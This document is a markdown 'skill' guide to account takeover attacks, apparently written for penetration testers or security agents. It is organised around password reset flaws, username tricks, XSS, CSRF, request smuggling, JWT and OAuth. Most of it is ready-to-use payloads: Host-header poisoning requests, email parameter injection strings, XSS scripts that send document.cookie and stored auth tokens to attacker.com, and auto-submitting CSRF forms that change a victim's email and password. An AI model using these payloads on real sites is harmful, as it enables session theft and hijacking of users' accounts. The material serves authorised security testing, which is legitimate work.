# Account Takeover

## Description
Account Takeover (ATO) is a cybersecurity threat involving unauthorized access to user accounts through multiple attack vectors. This skill covers various techniques to identify and exploit account takeover vulnerabilities.

## Attack Vectors

### 1. Password Reset Feature Vulnerabilities

#### Token Leak via Referrer
When a user clicks a link in a password reset email that contains a third-party resource, the token may leak via the Referer header.

```
1. Request password reset
2. Click on the reset link
3. Check if page loads external resources
4. Token may leak in Referer header to third-party
```

#### Password Reset Poisoning
Manipulate the Host header to poison the password reset link:

```http
POST /password-reset HTTP/1.1
Host: attacker.com
...
email=victim@example.com
```

Alternative headers to try:
```http
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Original-URL: attacker.com
```

#### Email Parameter Manipulation
```http
# Carbon copy
email=victim@email.com%0a%0dcc:attacker@email.com

# Using separators
email=victim@email.com,attacker@email.com
email=victim@email.com%20attacker@email.com
email=victim@email.com|attacker@email.com

# No domain
email=victim

# JSON injection
{"email":["victim@email.com","attacker@email.com"]}
```

#### Weak Token Generation
Test for predictable tokens:
```
- Tokens based on timestamp
- Sequential tokens
- Short tokens (brute-forceable)
- Tokens derived from user information
- Reusable tokens
```

### 2. Username/Email Manipulation

#### Unicode Normalization
```python
# Using Unicode characters that normalize to target
# Example: ᴬdmin normalizes to Admin

# Tool: Unisub
python unisub.py -u "admin" -s
```

#### Username Collision
```
- Trailing/leading spaces: "admin " vs "admin"
- Case sensitivity: "Admin" vs "admin"
- Unicode equivalents: "аdmin" (Cyrillic 'а') vs "admin"
```

### 3. Web Vulnerability-Based Takeover

#### XSS to Account Takeover
```javascript
// Steal session cookie
<script>
fetch('https://attacker.com/steal?cookie='+document.cookie);
</script>

// Steal localStorage token
<script>
fetch('https://attacker.com/steal?token='+localStorage.getItem('auth_token'));
</script>

// Change email/password
<script>
fetch('/api/user/update', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@email.com'})
});
</script>
```

#### CSRF to Account Takeover
```html
<!-- Change email -->
<form action="https://target.com/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@email.com"/>
</form>
<script>document.forms[0].submit();</script>

<!-- Change password -->
<form action="https://target.com/change-password" method="POST">
  <input type="hidden" name="new_password" value="hacked123"/>
  <input type="hidden" name="confirm_password" value="hacked123"/>
</form>
<script>document.forms[0].submit();</script>
```

#### HTTP Request Smuggling
```bash
# Using smuggler tool
python3 smuggler.py -u https://target.com

# CL.TE payload example
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
```

### 4. JWT Manipulation
See: [JSON Web Token skill](./31-json-web-token.md)

```bash
# Common JWT attacks
- Algorithm confusion (RS256 to HS256)
- None algorithm
- Weak secret brute force
- JKU/X5U header injection
- Kid injection
```

### 5. OAuth Misconfiguration
See: [OAuth Misconfiguration skill](./37-oauth-misconfiguration.md)

```
- Open redirect in OAuth flow
- Lack of state parameter validation
- Token leakage via redirect_uri manipulation
```

## Exploitation Workflow

1. **Reconnaissance**
   - Identify authentication mechanisms
   - Map password reset flow
   - Identify OAuth/SSO implementations

2. **Testing**
   - Test password reset for token leakage
   - Test for Host header injection
   - Test email parameter manipulation
   - Test for weak token generation

3. **Exploitation**
   - Capture/forge password reset tokens
   - Chain with other vulnerabilities (XSS, CSRF)
   - Exploit OAuth misconfigurations

## Tools
- Burp Suite
- [Smuggler](https://github.com/defparam/smuggler) - HTTP Request Smuggling
- [Unisub](https://github.com/tomnomnom/hacks/tree/master/unisub) - Unicode substitution

## Checklist

### Password Reset
- [ ] Token leaked in Referer header?
- [ ] Host header injection possible?
- [ ] Email parameter manipulation?
- [ ] Weak/predictable tokens?
- [ ] Token reuse possible?
- [ ] Token expiration enforced?

### Session Management
- [ ] Session fixation possible?
- [ ] Concurrent sessions allowed?
- [ ] Session not invalidated on password change?

### OAuth/SSO
- [ ] Open redirect in OAuth flow?
- [ ] State parameter validated?
- [ ] redirect_uri properly validated?

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Account%20Takeover
- https://portswigger.net/web-security/authentication
